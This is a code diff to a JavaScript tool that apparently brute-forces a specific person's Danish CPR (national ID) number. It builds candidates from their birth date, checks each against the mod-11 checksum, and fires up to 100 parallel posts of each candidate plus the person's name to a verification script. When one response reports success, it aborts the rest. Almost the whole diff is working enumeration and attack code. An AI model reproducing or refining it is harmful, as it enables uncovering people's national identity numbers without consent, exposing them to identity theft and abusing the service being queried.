@@ -4,7 +4,9 @@ var options,
 	dob, 
 	firstName, 
 	lastName, 
-	verified;
+	countRunning,
+	countCompleted,
+	xhr;
 
 $(document).ready(function() {
 	$('#findValidNumbers').click(function(){
@@ -12,8 +14,9 @@ $(document).ready(function() {
 		// reset
 		options = [];
 		possibilities = [];
-		verified = 0;
-		$(".verified").html("");
+		countRunning = 0;
+		countCompleted = 0;
+		xhr = [];
 				
 		// set date of birth
 		dob = $('input[name=dob]').val();
@@ -55,35 +58,66 @@ recursiveSearch = function (number, depth )
 			// yes: iterate the layer
 			recursiveSearch ( number + options[depth][i] , depth +1 );
 		}else{
-			// no: this is the last layer. we add the result to the array
-			var proposedCprNumber = number + options[depth][i]; 			
-			if(testCPR(proposedCprNumber)){
-				verified = (verified + 1);
-				
-				// cpr number could be valid. Post it
-				if(verified < 80){
-					$(".verified").append(proposedCprNumber + "<br/>");
-					possibilities.push ( proposedCprNumber );
-					$.post('post.php', {'cpr': proposedCprNumber, 'dob':dob, 'firstName': firstName, 'lastName': lastName}, function(response, proposedCprNumber){	
-						console.log(response);
-						if(response.indexOf("success") != -1){
-							alert(response);
-							return false;
-						}
-					});
-				}
-			}
+			postCpr(number + options[depth][i] );
 		}
 	}
 }
 
-function testCPR(lastfour){
-	var cprnr = dob + lastfour;
+function postCpr(cpr){
+	if(testCPR(cpr) && countRunning < 100){
+		
+			// count running requests
+			countRunning = (countRunning + 1);
+			$('#running').html(countRunning);
+
+			possibilities.push ( cpr );
+			console.log(cpr);
+			xhr[countRunning] = $.post('post.php', {'cpr': cpr, 'dob':dob, 'firstName': firstName, 'lastName': lastName}, function(response){
+			
+				// count completed requests
+				countCompleted = (countCompleted + 1);
+				$('#completed').html(countCompleted);	
+				
+				// we found the correct number
+				if(response.indexOf("success") != -1){
+				
+					// abort all requests
+					$.each(xhr, function(key, object) { 
+						if(object != undefined){
+							object.abort();
+							console.log(key + " aborted");
+						}
+					});
+
+					$("#correctCpr").html(response);
+				}
+				
+			});
+	}
+}
+
+function getParameterByName(name, str)
+{
+  name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
+  var regexS = "[\\?&]" + name + "=([^&#]*)";
+  var regex = new RegExp(regexS);
+  var results = regex.exec(str);
+  if(results == null)
+    return "";
+  else
+    return decodeURIComponent(results[1].replace(/\+/g, " "));
+}
+
+/************************
+ * test for valid cpr number
+ ***********************/
+function testCPR(cpr){
+	var fullcpr = dob + cpr;
 	var sum = 0;	
 	var factors = [ 4, 3, 2, 7, 6, 5, 4, 3, 2, 1 ];
 	
 	for (i = 0; i < 10; i++)	{
-		sum += cprnr.substring(i, i+1) * factors[i];
+		sum += fullcpr.substring(i, i+1) * factors[i];
 	}
 	
 	if ((sum % 11) != 0)	{
